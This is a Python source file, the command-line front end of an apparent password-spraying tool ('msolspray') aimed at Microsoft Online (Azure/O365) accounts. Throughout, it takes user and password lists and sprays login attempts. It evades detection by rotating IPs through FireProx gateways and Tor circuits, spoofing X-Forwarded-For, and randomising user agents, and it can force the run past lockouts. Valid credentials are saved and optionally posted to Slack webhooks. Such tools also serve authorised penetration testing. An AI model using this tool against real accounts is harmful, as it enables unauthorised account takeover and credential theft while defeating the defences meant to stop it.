import argparse
from math import trunc
from random import randrange, shuffle
from time import time

import urllib3

from msolspray.core import parse_response, post_processing, try_login, try_all_credentials
from msolspray.enum import AuthResult
from msolspray.tor import test_tor, test_circuits
from msolspray.notify import notify
from msolspray.utils import (
    get_list_from_file,
    print_error,
    print_info,
    print_success,
    print_warning,
    logger,
)

_description = (
    "This script will perform password spraying against Microsoft Online accounts (Azure/O365)."
    " The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't "
    "exist, if a user doesn't exist, if the account is locked, or if the account is disabled."
)

_epilog = (
    "EXAMPLE USAGE:\n"
    "This command will use the provided userlist and attempt to authenticate to each account "
    "with a password of Winter2020.\n"
    "    poetry run msolspray --userlist ./userlist.txt --password Winter2020\n"
    "\n"
    "This command uses the specified FireProx URL to spray from randomized IP "
    "addresses and writes the output to a file. See this for FireProx setup: "
    "https://github.com/ustayready/fireprox.\n"
    "    poetry run msolspray --userlist ./userlist.txt --password P@ssword "
    "--url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox "
    "--out valid-users.txt\n"
    "\n"
    "This command will create 5 Tor circuits and use them to "
    "spray from randomized IP addresses.\n"
    "    poetry run msolspray --userlist ./userlist.txt --password P@ssword "
    "--tor --tor-pool 5\n"
    "\n"
    "TIPS:\n"
    "[1] When using along with FireProx, pass option -H "
    '"X-My-X-Forwarded-For: 127.0.0.1" to spoof origin IP.'
)


def assertions(args):
    """Make assertions about the provided args.

    Args:
        args (optparse_parser.Values): parsed args as returned by argparse.parse_args
    """
    assert args.sleep >= 0
    assert args.pause >= 0
    assert args.jitter in range(101)
    assert args.max_lockout >= 0
    assert args.timeout >= 0
    assert args.creds or (
        (args.username or args.usernames) and (args.password or args.passwords)
    )
    if args.proxy:
        assert "://" in args.proxy, "Malformed proxy. Missing schema?"


def parse_args():

    parser = argparse.ArgumentParser(
        description=_description,
        epilog=_epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument("-u", "--username", type=str, help="Single username")
    group_user.add_argument(
        "-U",
        "--usernames",
        type=str,
        metavar="FILE",
        help="File containing usernames in the format 'user@domain'.",
    )
    group_user.add_argument(
        "-C",
        "--creds",
        type=str,
        metavar="FILE",
        help="File containing credentials in the format '<user><separator><password>'.",
    )
    group_user.add_argument(
        "--tor-test",
        action="store_true",
        help="Test Tor connectivity and exit.",
    )
    group_password = parser.add_mutually_exclusive_group(required=False)
    group_password.add_argument("-p", "--password", type=str, help="Single password.")
    group_password.add_argument(
        "-P",
        "--passwords",
        type=str,
        help="File containing passwords, one per line.",
        metavar="FILE",
    )
    parser.add_argument(
        "--sep",
        default=",",
        help="Separator used when parsing credentials file in CSV format.",
    )
    parser.add_argument(
        "-o",
        "--out",
        metavar="OUTFILE",
        default="valid_creds.txt",
        help="A file to output valid results to (default: %(default)s).",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        help="Use proxy on requests (e.g. http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--url",
        default="https://login.microsoft.com",
        help=(
            "A comma-separated list of URL(s) to spray against (default: %(default)s)."
            " Potentially useful if pointing at an API Gateway URL generated with something like "
            "FireProx to randomize the IP address you are authenticating from."
        ),
    )
    group_force = parser.add_mutually_exclusive_group(required=False)
    group_force.add_argument(
        "-f",
        "--force",
        action="store_true",
        help="Forces the spray to continue and not stop when multiple account lockouts are detected.",
    )
    group_force.add_argument(
        "--force-first",
        action="store_true",
        dest="force_first",
        help="Like --force but only for first iteration. Use it with '-a 2' for optimization.",
    )
    parser.add_argument(
        "--shuffle",
        action="store_true",
        help="Shuffle user list.",
    )
    parser.add_argument(
        "-a",
        "--auto-remove",
        dest="auto_remove",
        default=0,
        type=int,
        choices=[0, 1, 2],
        help="Auto remove accounts from next iterations (0: valid "
        + "credentials (default), 1: previous + nonexistent/disabled, "
        + "2: previous + locked).",
    )
    parser.add_argument(
        "--notify",
        type=str,
        help="Slack webhook for sending notifications about results "
        + "(default: %(default)s).",
        default=None,
        required=False,
    )
    parser.add_argument(
        "--notify-actions",
        type=str,
        dest="notify_actions",
        help="Slack webhook for sending notifications about needed "
        + "actions (default: same as --notify).",
        default=None,
        required=False,
    )
    parser.add_argument(
        "--notify-each",
        action="store_true",
        dest="notify_each",
        help="If set in conjunction with --notify WEBHOOK, it will "
        + "notify each valid creds besides final summary.",
    )
    parser.add_argument(
        "-s",
        "--sleep",
        default=0,
        type=int,
        help="Sleep this many seconds between tries (default: %(default)s).",
    )
    parser.add_argument(
        "--pause",
        default=15,
        type=float,
        help="Pause (in minutes) between each iteration " + "(default: %(default)s).",
    )
    parser.add_argument(
        "-j",
        "--jitter",
        type=int,
        default=0,
        help="Maximum of additional delay given in percentage over base "
        + "delay (default: %(default)s).",
    )
    parser.add_argument(
        "-l",
        "--max-lockout",
        default=10,
        metavar="PERCENT",
        type=int,
        dest="max_lockout",
        help="Maximum lockouts (in percent) to be observed before ask to "
        + "abort execution. (default: %(default)s).",
    )
    parser.add_argument(
        "-H",
        "--header",
        help="Extra header to include in the request "
        + "(can be used multiple times).",
        action="append",
        dest="headers",
    )
    parser.add_argument(
        "-A",
        "--user-agent",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        + "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        dest="user_agent",
        metavar="NAME",
        help='Send User-Agent %(metavar)s to server (default: "%(default)s").',
    )
    parser.add_argument(
        "--rua",
        action="store_true",
        help="Send random User-Agent in " + "each request.",
    )
    parser.add_argument(
        "--timeout",
        default=4,
        type=float,
        help="Timeout for requests (default: %(default)s)",
    )
    parser.add_argument(
        "--tor",
        action="store_true",
        help="Use Tor for requests (overrides --proxy).",
    )
    parser.add_argument(
        "--tor-port",
        dest="socks_port",
        default=9050,
        type=int,
        help="Tor socks port to use (default: %(default)s).",
    )
    parser.add_argument(
        "--tor-pool",
        dest="tor_pool",
        default=10,
        type=int,
        help="Number of Tor circuits to create (default: %(default)s).",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Prints usernames that could exist in case of invalid password.",
    )

    args = parser.parse_args()

    if not args.tor_test:
        assertions(args)

        args.pause = args.pause * 60
        args.jitter += 1
        if args.notify and args.notify_actions is None:
            args.notify_actions = args.notify

        args.url = args.url.split(",")

    return args


def main():
    # disable ssl warnings
    urllib3.disable_warnings()

    args = parse_args()

    if args.verbose:
        logger.setLevel("DEBUG")

    if args.tor_test:
        try:
            print_info("Testing Tor configuration...")
            test_tor(args.socks_port)
            print_info("Testing Tor circuits...")
            test_circuits(args.socks_port, args.tor_pool)
        except Exception as e:
            print_error(f"Error occurred while testing Tor: {e}")
        return

    if args.creds:
        credentials = get_list_from_file(args.creds)
    else:
        usernames = (
            [args.username] if args.username else get_list_from_file(args.usernames)
        )
        passwords = (
            [args.password] if args.password else get_list_from_file(args.passwords)
        )


    print_info("Now spraying Microsoft Online.")
    if args.creds:
        try_all_credentials(credentials, args, 0)
    else:
        for pindex, password in enumerate(passwords):
            credentials = [f"{username}{args.sep}{password}" for username in usernames]
            users_to_remove = try_all_credentials(credentials, args, pindex)
            for user in users_to_remove:
                try:
                    usernames.remove(user)
                except Exception as e:
                    print_warning(f"Error while removing {user} from usernames: {e}")
